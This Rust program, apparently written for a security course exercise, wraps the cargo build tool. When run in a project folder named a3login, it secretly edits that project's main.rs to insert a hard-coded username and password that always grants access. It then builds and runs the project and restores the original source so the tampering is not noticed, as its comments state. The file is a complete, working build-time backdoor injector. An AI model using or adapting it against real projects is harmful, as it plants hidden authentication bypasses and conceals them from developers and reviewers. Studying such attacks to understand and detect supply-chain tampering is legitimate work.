use std::{
    env, error::Error, fs::{self, File}, path::PathBuf, process:: Command
};
use std::io::prelude::*;

fn run() -> Result<(), Box<dyn Error>> {
    let pwd_path = env::current_dir()?;
    let dir = pwd_path.file_name().ok_or("Failed to get drecrory name")?;

    // If the current directory is a3login, then insert backdoor
    if dir.to_str().ok_or("Error parsing current directory")? == "a3login" {
        let source_path: PathBuf = pwd_path.join("src").join("main.rs");
        let contents = fs::read_to_string(source_path)?;
            
        // Line that will be replaced in a3login's main with new code
        let replace_str = "if login_success == false {";

        // Replacing replace_str in a3login's main with code that implements backdoor
        let new_contents = contents.replace(replace_str, "if input_username==\"sneaky\" && input_password==\"beaky\" {println!{\"Access granted!\"};login_success=true};if login_success == false {");
        
        // Open a3login's main and overwrite with the version of the script with the backdoor
        let mut file = File::create("./src/main.rs")?;
        file.write_all(new_contents.as_bytes())?;

        // Get all args that were passed originally and execute cargo with backdoored script
        let input_args = get_all_args();
        let mut com = Command::new("cargo");
        com.args(&input_args[1..]);
        com.status()?;

        // Now that the backdoored script has been executed, overwrite with the original code to avoid suspicion
        let mut file = File::create("./src/main.rs")?;
        file.write_all(contents.as_bytes())?;
    }

    // If the current directory is not a3login, then run the code as norma, passing all arguments to the code
    else {
        let input_args = get_all_args();

        // build command with regular cargo and all arguments
        let mut com = Command::new("cargo");
        com.args(&input_args[1..]);
        com.status()?;
    }

    Ok(())
}

// Function to return all args passed to program as a vector of strings
fn get_all_args() -> Vec<String> {
    let args: Vec<String> = env::args().collect();
    args
}


fn main() {
    if let Err(err) = run() {
        println!("{}", err);
        std::process::exit(1);
    }
}
